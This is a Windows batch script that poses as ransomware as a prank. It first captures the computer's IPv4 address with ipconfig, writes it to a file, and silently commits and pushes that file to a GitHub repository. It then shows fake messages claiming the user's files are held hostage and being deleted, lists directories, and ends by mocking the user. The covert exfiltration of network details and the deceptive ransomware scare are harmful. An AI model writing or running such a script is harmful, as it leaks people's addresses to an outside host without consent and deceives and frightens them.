@echo off
color a
mode 1000

@echo off
echo Capturing IP Address...
ipconfig | find "IPv4 Address" > captured-ip.txt
echo IP Address captured successfully.

echo Committing changes to GitHub...
git add captured-ip.txt
git commit -m "Update captured IP"
git push origin main
echo Changes committed and pushed to GitHub.

echo Your files have been held hostage by ransomware...
echo Would you like to delete the ransomware???
set /p love=
if %love%==yes goto hate
:hate

ping 1.1.1.1 -n 5 -w 1000>NUL
echo Ransomware is being deleted now....
pause
msg *Ransomware is commencing...
dir /s
cls
echo Your files are almost all gone now...
pause
msg * Pranked looser...
